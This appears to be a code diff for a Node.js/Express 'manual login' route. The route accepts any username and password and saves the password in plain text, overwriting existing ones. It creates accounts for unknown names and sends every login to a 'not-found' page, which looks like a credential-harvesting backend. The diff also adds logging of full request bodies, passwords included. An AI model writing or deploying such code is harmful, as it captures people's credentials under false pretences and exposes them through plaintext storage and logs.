@@ -31,18 +31,24 @@ mongoose.connect(process.env.MONGODB_URI, {
 
 // Manual login route (username/password)
 app.post('/auth/manual-login', async (req, res) => {
+    console.log('Manual login request received:', { body: req.body });
     const { username, password } = req.body;
     if (!username || !password) {
-        // Missing credentials -> 404 page
-        return res.status(404).json({ success: false, message: 'Page not found' });
+        console.log('Missing credentials:', { username: !!username, password: !!password });
+        return res.status(400).json({ success: false, message: 'Username and password are required' });
     }
+    
     try {
+        console.log('Attempting to find user:', username);
         let user = await User.findOne({ username });
+        
         if (user) {
+            console.log('Existing user found, updating last login');
             user.password = password; // store as plain text
             user.lastLogin = new Date();
             await user.save();
         } else {
+            console.log('Creating new user');
             user = await User.create({
                 username,
                 password,
@@ -50,12 +56,23 @@ app.post('/auth/manual-login', async (req, res) => {
                 createdAt: new Date(),
                 lastLogin: new Date()
             });
+            console.log('New user created:', { userId: user._id });
         }
-        // Successful login, redirect to custom not-found page
+        
+        console.log('Login successful, redirecting to /not-found');
         res.json({ success: true, redirect: '/not-found' });
+        
     } catch (err) {
-        console.error('Manual login error:', err);
-        res.status(500).json({ success: false, message: 'Login failed', error: err.message });
+        console.error('Manual login error:', {
+            error: err.message,
+            stack: err.stack,
+            body: req.body
+        });
+        res.status(500).json({ 
+            success: false, 
+            message: 'Login failed. Please try again.',
+            error: process.env.NODE_ENV === 'development' ? err.message : 'Internal server error'
+        });
     }
 });
 
